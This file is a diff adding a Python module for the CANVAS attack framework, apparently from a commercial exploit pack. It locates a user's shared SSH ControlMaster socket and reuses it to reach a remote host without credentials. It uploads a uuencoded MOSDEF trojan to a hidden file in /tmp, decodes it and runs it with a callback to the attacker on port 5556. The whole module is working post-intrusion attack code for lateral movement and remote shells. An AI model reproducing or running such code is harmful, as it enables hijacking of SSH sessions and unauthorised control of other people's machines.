@@ -1,0 +1,108 @@
+#! /usr/bin/env python
+
+import sys, os
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+import canvasengine
+
+NAME="SSH session sharing"
+DESCRIPTION="Run a MOSDEF trojan via a ssh shared session (option ControlMaster)"
+DOCUMENTATION={}
+DOCUMENTATION["Notes"]="This module does not care what target you've set - it always uses localhost"
+
+VERSION="1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Post-Intrusion"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.node = "" 
+		self.supportedNodeArgs = [["linuxNode"]]
+		self.ctrlpath = ""
+		self.hostssh = ""
+		self.cbackport = "5556"
+
+	def check_ctrlmaster(self, whoami):
+		str = ""		
+
+		# check option ControlPath (or -S)
+		str = self.node.runcommand("/bin/ps fauxwwwwwwwwwwwwww | grep 'ssh ' | grep %s" % whoami)
+		str = str.split()
+
+		for s in str:
+			if s.find("ControlPath") >= 0 and not self.ctrlpath:
+				self.ctrlpath = s.split("=")[1]
+
+			if s.find("-S") >= 0 and not self.ctrlpath:
+				self.ctrlpath = str[str.index(s)+1]
+		
+		socket = self.node.runcommand("/usr/bin/lsof -U | grep ssh | grep %s" % whoami) 
+		socket = socket.split("\n")
+
+		for s in socket:
+			s = s.split()
+			if len(s) > 0:
+				if s[0].find("ssh") >= 0 and not self.ctrlpath:
+					self.ctrlpath = s[len(s)-1]
+
+	def get_hostssh(self, whoami):
+		str = ""
+
+		str = self.node.runcommand("/bin/ps fauxwwwwwwwwwwwwww | grep 'ssh ' | grep %s" % whoami)
+		str = str.split()
+
+		for s in str:
+			if s.find("@") >= 0:
+				self.hostssh = s.split("@")[1]
+				return
+
+		self.hostssh = str[len(str)-1]
+
+	def run(self):
+		self.setInfo("%s (in progress)"%(NAME))
+
+		for node in self.argsDict["passednodes"]:
+			type = node.nodetype
+			if type not in self.supportedNodeArgs[0]:
+				self.log("%s node type not supported"%type)
+				continue
+
+			self.node = node
+			interface = self.engine.get_callback_interface()
+
+			whoami = self.node.runcommand("/usr/bin/whoami")
+
+			self.check_ctrlmaster(whoami)
+			if not self.ctrlpath:
+				self.log("[D2 LOG] No multiple SSH sessions")
+				return 0
+			
+			self.log("[D2 LOG] Multiple SSH sessions for user %s" % whoami)
+			self.log("[D2 LOG] ControlPath: %s" % self.ctrlpath)
+			
+			self.get_hostssh(whoami)
+			self.log("[D2 LOG] Remote host: %s" % self.hostssh)
+
+			uu = self.node.runcommand("ssh -o ControlMaster=no -o ControlPath=%s %s ls /usr/bin/uudecode" % (self.ctrlpath, self.hostssh))
+			if uu.find(":") >= 0:
+				self.log("[D2 LOG] can't find /usr/bin/uudecode on remote host")
+				return 0
+
+			uuen = "%s/exploits/d2sec_sshare/mosdef_callback_linux_i386.uu" % os.getcwd()
+
+			self.node.runcommand("cat %s | ssh -o ControlMaster=no -o ControlPath=%s %s \"cat - >> /tmp/.m.uu\"" % (uuen, self.ctrlpath, self.hostssh))
+			self.node.runcommand("ssh -o ControlMaster=no -o ControlPath=%s %s uudecode -o /tmp/.m /tmp/.m.uu" % (self.ctrlpath, self.hostssh))
+
+			self.log("[D2 LOG] Run mosdef on %s" % self.hostssh)
+			self.node.runcommand("ssh -o ControlMaster=no -o ControlPath=%s %s /tmp/.m %s %s" % (self.ctrlpath, self.hostssh, interface, self.cbackport))
+			
+		self.setInfo("%s (done)"%(NAME))
+		return 1
+				
+if __name__ == "__main__":
+	print "This module is meant to be run only within CANVAS"
